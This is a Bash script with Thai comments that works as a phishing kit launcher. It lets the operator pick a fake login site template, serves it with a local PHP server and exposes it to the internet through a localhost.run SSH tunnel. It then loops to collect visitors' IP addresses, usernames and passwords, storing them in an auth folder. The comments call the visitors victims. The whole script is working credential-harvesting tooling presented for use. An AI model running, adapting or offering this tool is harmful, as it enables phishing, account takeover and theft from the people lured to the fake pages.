#!/bin/bash

RED='\e[31m'
GREEN='\e[32m'
BLUE='\e[34m'
ORANGE='\e[33m'
WHITE='\e[0m'

HOST="127.0.0.1"
PORT="8080"
WEB_ROOT=".server/www"

# สร้างโฟลเดอร์เว็บถ้ายังไม่มี
mkdir -p "$WEB_ROOT"

# ฟังก์ชัน setup เว็บจาก template ที่เลือก
setup_site() {
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server...${WHITE}"
    # เคลียร์โฟลเดอร์เว็บเก่า
    rm -rf "$WEB_ROOT"/*
    cp -r ".sites/$website/"* "$WEB_ROOT"/
    cp -f ".sites/ip.php" "$WEB_ROOT/"
}

# สตาร์ท PHP server แบบ background
start_php_server() {
    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server at ${HOST}:${PORT}...${WHITE}"
    cd "$WEB_ROOT" || exit 1
    php -S "$HOST:$PORT" > /dev/null 2>&1 &
    PHP_PID=$!
    cd - > /dev/null
    sleep 1
    echo " Done"
}

# สตาร์ท tunnel ผ่าน localhost.run แบบเงียบๆ
start_tunnel() {
    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting tunnel via localhost.run...${WHITE}"

    rm -f tunnel.log

    # ใช้ stdbuf ป้องกัน delay ในการเขียน log
    stdbuf -oL ssh -o StrictHostKeyChecking=no -o LogLevel=ERROR \
        -R 80:${HOST}:${PORT} ssh.localhost.run > tunnel.log 2>&1 &

    TUNNEL_PID=$!

    # รอสูงสุด 10 วินาที
    for i in {1..20}; do
        sleep 0.5
        URL=$(grep -Eo "https://[a-zA-Z0-9.-]+\.lhr\.life" tunnel.log | head -n1)
        if [[ -n "$URL" ]]; then
            echo -e "\n[+] Public URL: ${GREEN}${URL}${WHITE}"
            return
        fi
    done

    echo -e "\n${RED}[!] Failed to get public URL. Check tunnel.log for details.${WHITE}"
    kill $TUNNEL_PID 2>/dev/null
    exit 1
}

# ดักจับ IP ที่เหยื่อเข้ามา (อ่านจาก ip.txt)
capture_ip() {
    IP=$(awk -F'IP: ' '{print $2}' "$WEB_ROOT/ip.txt" 2>/dev/null | xargs)
    if [[ -n "$IP" ]]; then
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP: ${BLUE}${IP}${WHITE}"
        echo "$IP" >> auth/ip.txt
        rm -f "$WEB_ROOT/ip.txt"
    fi
}

# ดักจับบัญชีผู้ใช้และรหัสผ่าน (อ่านจาก usernames.txt)
capture_creds() {
    ACCOUNT=$(grep -o 'Username:.*' "$WEB_ROOT/usernames.txt" 2>/dev/null | awk '{print $2}')
    PASSWORD=$(grep -o 'Pass:.*' "$WEB_ROOT/usernames.txt" 2>/dev/null | awk -F ":." '{print $NF}')
    if [[ -n "$ACCOUNT" && -n "$PASSWORD" ]]; then
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account: ${BLUE}${ACCOUNT}${WHITE}"
        echo -e "${RED}[${WHITE}-${RED}]${GREEN} Password: ${BLUE}${PASSWORD}${WHITE}"
        echo "$ACCOUNT:$PASSWORD" >> auth/usernames.dat
        rm -f "$WEB_ROOT/usernames.txt"
    fi
}

# ฟังก์ชันรันลูปรอข้อมูลใหม่ๆ จากเหยื่อ
capture_data() {
    echo -e "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
    while true; do
        if [[ -f "$WEB_ROOT/ip.txt" ]]; then
            capture_ip
        fi
        if [[ -f "$WEB_ROOT/usernames.txt" ]]; then
            capture_creds
        fi
        sleep 1
    done
}

# รายชื่อ template พร้อมให้เลือก
list_templates() {
    echo "[*] Available Templates:"
    local i=1
    for d in .sites/*; do
        if [[ -d "$d" ]]; then
            echo " $i) $(basename "$d")"
            ((i++))
        fi
    done
}

# MAIN

# สร้างโฟลเดอร์เก็บข้อมูลเหยื่อถ้ายังไม่มี
mkdir -p auth

list_templates
echo -n "#? "
read -r choice

# แปลงเลข choice เป็นชื่อโฟลเดอร์ template
website=$(ls -d .sites/* | sed -n "${choice}p" | xargs basename)

if [[ -z "$website" ]]; then
    echo "Invalid choice."
    exit 1
fi

setup_site
start_php_server
start_tunnel
capture_data
